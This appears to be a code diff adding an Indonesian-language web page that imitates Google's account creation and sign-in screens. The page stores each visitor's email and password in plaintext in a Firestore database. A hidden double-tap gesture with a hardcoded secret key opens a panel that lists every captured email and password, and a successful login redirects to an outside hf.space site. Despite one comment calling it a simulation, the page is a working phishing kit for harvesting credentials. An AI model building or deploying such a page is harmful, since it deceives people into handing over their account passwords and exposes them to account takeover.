@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buat Akun Google</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f4f9;
+        }
+        .form-container {
+            display: none;
+        }
+        .form-container.active {
+            display: block;
+        }
+        /* Style untuk modal kunci rahasia */
+        #secret-key-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #secret-key-modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            max-width: 90%;
+            width: 400px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+        }
+        .modal-content button {
+            margin-top: 1rem;
+            width: 100%;
+        }
+        #registered-users-list {
+            margin-top: 1rem;
+            text-align: left;
+            overflow-y: auto;
+            max-height: 200px;
+        }
+        #registered-users-list p {
+            background-color: #f3f4f6;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100 p-4">
+
+    <div class="bg-white rounded-2xl shadow-lg p-8 w-full max-w-lg md:flex">
+        <div class="flex-1 md:pr-8">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="h-10 mb-6">
+            
+            <div id="signup-container" class="form-container active">
+                <h1 class="text-2xl font-semibold text-gray-800 mb-2">Buat Akun Google Anda</h1>
+                <p class="text-gray-600 mb-6">Lanjutkan ke Google.</p>
+
+                <form id="signup-form">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <input type="text" id="firstName" name="firstName" placeholder="Nama Depan" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                        </div>
+                        <div>
+                            <input type="text" id="lastName" name="lastName" placeholder="Nama Belakang (opsional)" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                        </div>
+                    </div>
+
+                    <div class="mb-4">
+                        <input type="email" id="email" name="email" placeholder="Email" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                        <p class="text-sm text-gray-500 mt-2">Anda dapat menggunakan huruf, angka & titik.</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <input type="password" id="password" name="password" placeholder="Kata Sandi" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                        </div>
+                        <div>
+                            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Konfirmasi" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                        </div>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-6">Gunakan 8 karakter atau lebih dengan campuran huruf, angka & simbol.</p>
+
+                    <div class="flex items-center mb-6">
+                        <input type="checkbox" id="showPassword" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="showPassword" class="ml-2 text-sm text-gray-700">Tampilkan sandi</label>
+                    </div>
+
+                    <div id="signup-message-container" class="mt-4 p-4 rounded-lg text-sm hidden"></div>
+
+                    <div class="flex justify-between items-center">
+                        <button type="button" id="show-login" class="text-blue-600 hover:underline">Masuk</button>
+                        <button type="submit" id="signup-button" class="bg-blue-600 text-white font-medium py-2 px-6 rounded-full hover:bg-blue-700 transition duration-300">Berikutnya</button>
+                    </div>
+                </form>
+            </div>
+
+            <div id="login-container" class="form-container">
+                <h1 class="text-2xl font-semibold text-gray-800 mb-2">Masuk</h1>
+                <p class="text-gray-600 mb-6">Gunakan Akun Google Anda.</p>
+
+                <form id="login-form">
+                    <div class="mb-4">
+                        <input type="email" id="loginEmail" name="loginEmail" placeholder="Email" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                    </div>
+
+                    <div class="mb-4">
+                        <input type="password" id="loginPassword" name="loginPassword" placeholder="Kata Sandi" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-300">
+                    </div>
+                    
+                    <div class="flex items-center mb-6">
+                        <input type="checkbox" id="showLoginPassword" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="showLoginPassword" class="ml-2 text-sm text-gray-700">Tampilkan sandi</label>
+                    </div>
+
+                    <div id="login-message-container" class="mt-4 p-4 rounded-lg text-sm hidden"></div>
+
+                    <div class="flex justify-between items-center">
+                        <button type="button" id="show-signup" class="text-blue-600 hover:underline">Buat akun</button>
+                        <button type="submit" id="login-button" class="bg-blue-600 text-white font-medium py-2 px-6 rounded-full hover:bg-blue-700 transition duration-300">Berikutnya</button>
+                    </div>
+                </form>
+            </div>
+            
+             <div id="success-container" class="form-container text-center">
+                <h1 class="text-2xl font-semibold text-gray-800 mb-2">Selamat Datang!</h1>
+                <p id="welcome-message" class="text-gray-600 mb-6"></p>
+                <button id="logout-button" class="bg-red-600 text-white font-medium py-2 px-6 rounded-full hover:bg-red-700 transition duration-300">Keluar</button>
+            </div>
+        </div>
+        
+        <div class="hidden md:flex flex-1 items-center justify-center p-4">
+            <img id="dynamic-image" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Akun Google" class="w-48 h-48 object-contain">
+        </div>
+    </div>
+
+    <div id="secret-key-modal">
+        <div class="modal-content">
+            <h2 class="text-xl font-semibold text-gray-800 mb-4">Masukkan Kunci Rahasia</h2>
+            <input type="password" id="secret-key-input" placeholder="Kunci Rahasia">
+            <button id="secret-key-submit" class="bg-blue-600 text-white font-medium py-2 px-6 rounded-full hover:bg-blue-700 transition duration-300">Lihat Pengguna</button>
+            <p id="secret-key-message" class="text-red-500 mt-2 hidden"></p>
+            <div id="registered-users-list"></div>
+            <button id="secret-key-close" class="bg-gray-400 text-white font-medium py-2 px-6 rounded-full mt-4 hover:bg-gray-500 transition duration-300">Tutup</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, addDoc, query, where } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Global variables provided by the environment
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+        
+        // Inisialisasi Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // Elemen UI
+        const signupContainer = document.getElementById('signup-container');
+        const loginContainer = document.getElementById('login-container');
+        const successContainer = document.getElementById('success-container');
+        const showLoginBtn = document.getElementById('show-login');
+        const showSignupBtn = document.getElementById('show-signup');
+        const logoutBtn = document.getElementById('logout-button');
+        const dynamicImage = document.getElementById('dynamic-image');
+        const signupForm = document.getElementById('signup-form');
+        const loginForm = document.getElementById('login-form');
+        const signupMessageContainer = document.getElementById('signup-message-container');
+        const loginMessageContainer = document.getElementById('login-message-container');
+        const welcomeMessage = document.getElementById('welcome-message');
+
+        // Modal dan elemen-elemennya
+        const secretKeyModal = document.getElementById('secret-key-modal');
+        const secretKeyInput = document.getElementById('secret-key-input');
+        const secretKeySubmitBtn = document.getElementById('secret-key-submit');
+        const secretKeyCloseBtn = document.getElementById('secret-key-close');
+        const secretKeyMessage = document.getElementById('secret-key-message');
+        const registeredUsersList = document.getElementById('registered-users-list');
+
+        const usersCollectionPath = `/artifacts/${appId}/public/data/registered_users`;
+        
+        // Cek otentikasi awal
+        const authenticateUser = async () => {
+            try {
+                if (initialAuthToken) {
+                    await signInWithCustomToken(auth, initialAuthToken);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (error) {
+                console.error("Kesalahan otentikasi:", error);
+            }
+        };
+
+        // Fungsi untuk menampilkan modal kunci rahasia
+        const showSecretModal = () => {
+            secretKeyModal.classList.add('active');
+            secretKeyInput.value = '';
+            secretKeyMessage.textContent = '';
+            secretKeyMessage.classList.add('hidden');
+            registeredUsersList.innerHTML = '';
+        };
+
+        // Logika untuk mendeteksi ketukan ganda di pojok kanan atas
+        let lastTap = 0;
+        const DOUBLE_TAP_TIMEOUT = 300; // milliseconds
+        const DOUBLE_TAP_AREA_WIDTH = window.innerWidth * 0.3; // 30% of screen width
+        const DOUBLE_TAP_AREA_HEIGHT = window.innerHeight * 0.3; // 30% of screen height
+
+        document.body.addEventListener('touchend', function(event) {
+            const now = new Date().getTime();
+            const timeDiff = now - lastTap;
+            const touch = event.changedTouches[0];
+
+            if (timeDiff < DOUBLE_TAP_TIMEOUT && touch.clientX > window.innerWidth - DOUBLE_TAP_AREA_WIDTH && touch.clientY < DOUBLE_TAP_AREA_HEIGHT) {
+                showSecretModal();
+            }
+            lastTap = now;
+        });
+
+        // Event listener untuk tombol submit kunci rahasia
+        secretKeySubmitBtn.addEventListener('click', async () => {
+            const key = secretKeyInput.value;
+            const secretKey = 'AIzaSyA8WhiSO-cUYPq6EbZqbFGxJb342IoEYEY'; // Kunci rahasia
+            
+            secretKeyMessage.classList.add('hidden');
+            registeredUsersList.innerHTML = '';
+            
+            if (key === secretKey) {
+                try {
+                    const usersRef = collection(db, usersCollectionPath);
+                    const querySnapshot = await getDocs(usersRef);
+                    
+                    if (querySnapshot.empty) {
+                        registeredUsersList.innerHTML = '<p class="text-gray-500">Tidak ada pengguna terdaftar.</p>';
+                    } else {
+                        let listHtml = '';
+                        querySnapshot.forEach(doc => {
+                            const data = doc.data();
+                            listHtml += `<p class="bg-gray-100 p-2 rounded-lg mb-2"><strong>Email:</strong> ${data.email}<br><strong>Sandi:</strong> ${data.password}</p>`;
+                        });
+                        registeredUsersList.innerHTML = listHtml;
+                    }
+
+                } catch (error) {
+                    console.error("Gagal mengambil data:", error);
+                    secretKeyMessage.textContent = 'Gagal mengambil data. Silakan coba lagi.';
+                    secretKeyMessage.classList.remove('hidden');
+                }
+
+            } else {
+                secretKeyMessage.textContent = 'Kunci rahasia salah.';
+                secretKeyMessage.classList.remove('hidden');
+            }
+        });
+
+        // Event listener untuk tombol tutup modal
+        secretKeyCloseBtn.addEventListener('click', () => {
+            secretKeyModal.classList.remove('active');
+        });
+
+        // UI functionality
+        showLoginBtn.addEventListener('click', () => {
+            signupContainer.classList.remove('active');
+            loginContainer.classList.add('active');
+            dynamicImage.src = 'https://ssl.gstatic.com/accounts/ui/avatar_2x.png';
+        });
+
+        showSignupBtn.addEventListener('click', () => {
+            loginContainer.classList.remove('active');
+            signupContainer.classList.add('active');
+            dynamicImage.src = 'https://ssl.gstatic.com/accounts/ui/avatar_2x.png';
+        });
+
+        logoutBtn.addEventListener('click', async () => {
+            try {
+                await signOut(auth);
+            } catch (error) {
+                console.error("Kesalahan keluar:", error);
+            }
+        });
+
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            const confirmPasswordField = document.getElementById('confirmPassword');
+            if (this.checked) {
+                passwordField.type = 'text';
+                confirmPasswordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+                confirmPasswordField.type = 'password';
+            }
+        });
+        
+        document.getElementById('showLoginPassword').addEventListener('change', function() {
+            const loginPasswordField = document.getElementById('loginPassword');
+            if (this.checked) {
+                loginPasswordField.type = 'text';
+            } else {
+                loginPasswordField.type = 'password';
+            }
+        });
+
+        signupForm.addEventListener('submit', async function(event) {
+            event.preventDefault(); 
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+
+            signupMessageContainer.textContent = '';
+            signupMessageContainer.className = 'mt-4 p-4 rounded-lg text-sm hidden';
+
+            if (password !== confirmPassword) {
+                signupMessageContainer.textContent = 'Kata sandi tidak cocok. Silakan coba lagi.';
+                signupMessageContainer.classList.remove('hidden');
+                signupMessageContainer.classList.add('bg-red-100', 'text-red-700');
+                return;
+            }
+            if (password.length < 8) {
+                signupMessageContainer.textContent = 'Kata sandi harus 8 karakter atau lebih.';
+                signupMessageContainer.classList.remove('hidden');
+                signupMessageContainer.classList.add('bg-red-100', 'text-red-700');
+                return;
+            }
+
+            try {
+                const usersRef = collection(db, usersCollectionPath);
+                // Periksa apakah email sudah terdaftar
+                const q = query(usersRef, where("email", "==", email));
+                const querySnapshot = await getDocs(q);
+
+                if (!querySnapshot.empty) {
+                    signupMessageContainer.textContent = 'Email ini sudah terdaftar. Silakan masuk.';
+                    signupMessageContainer.classList.remove('hidden');
+                    signupMessageContainer.classList.add('bg-blue-100', 'text-blue-700');
+                    return;
+                }
+
+                // Tambahkan data pengguna baru jika email belum ada
+                await addDoc(usersRef, {
+                    firstName: firstName,
+                    lastName: lastName,
+                    email: email,
+                    // PERINGATAN: Ini adalah simulasi. Menyimpan kata sandi dalam teks biasa tidak aman dalam aplikasi nyata.
+                    password: password,
+                    createdAt: new Date()
+                });
+
+                signupMessageContainer.textContent = 'Pendaftaran berhasil. Silakan masuk.';
+                signupMessageContainer.classList.remove('hidden');
+                signupMessageContainer.classList.add('bg-green-100', 'text-green-700');
+                
+                setTimeout(() => {
+                    signupContainer.classList.remove('active');
+                    loginContainer.classList.add('active');
+                    document.getElementById('loginEmail').value = email;
+                    signupMessageContainer.classList.add('hidden');
+                }, 1500);
+
+            } catch (error) {
+                console.error("Pendaftaran gagal:", error);
+                let errorMessage = 'Pendaftaran gagal. Silakan coba lagi.';
+                signupMessageContainer.textContent = errorMessage;
+                signupMessageContainer.classList.remove('hidden');
+                signupMessageContainer.classList.add('bg-red-100', 'text-red-700');
+            }
+        });
+        
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const loginEmail = document.getElementById('loginEmail').value;
+            const loginPassword = document.getElementById('loginPassword').value;
+            
+            loginMessageContainer.textContent = '';
+            loginMessageContainer.className = 'mt-4 p-4 rounded-lg text-sm hidden';
+
+            try {
+                const usersRef = collection(db, usersCollectionPath);
+                // Cari pengguna berdasarkan email
+                const q = query(usersRef, where("email", "==", loginEmail));
+                const querySnapshot = await getDocs(q);
+
+                if (querySnapshot.empty) {
+                     loginMessageContainer.textContent = 'Email atau kata sandi salah. Silakan coba lagi.';
+                     loginMessageContainer.classList.remove('hidden');
+                     loginMessageContainer.classList.add('bg-red-100', 'text-red-700');
+                     return;
+                }
+
+                const userData = querySnapshot.docs[0].data();
+                if (userData.password === loginPassword) {
+                    loginMessageContainer.textContent = 'Login berhasil! Mengalihkan...';
+                    loginMessageContainer.classList.remove('hidden');
+                    loginMessageContainer.classList.add('bg-green-100', 'text-green-700');
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://zenefil-veobatch.hf.space/';
+                    }, 2000);
+                } else {
+                    loginMessageContainer.textContent = 'Email atau kata sandi salah. Silakan coba lagi.';
+                    loginMessageContainer.classList.remove('hidden');
+                    loginMessageContainer.classList.add('bg-red-100', 'text-red-700');
+                }
+            } catch (error) {
+                console.error("Login gagal:", error);
+                let errorMessage = 'Login gagal. Silakan coba lagi.';
+                loginMessageContainer.textContent = errorMessage;
+                loginMessageContainer.classList.remove('hidden');
+                loginMessageContainer.classList.add('bg-red-100', 'text-red-700');
+            }
+        });
+        
+        authenticateUser();
+    </script>
+</body>
+</html>
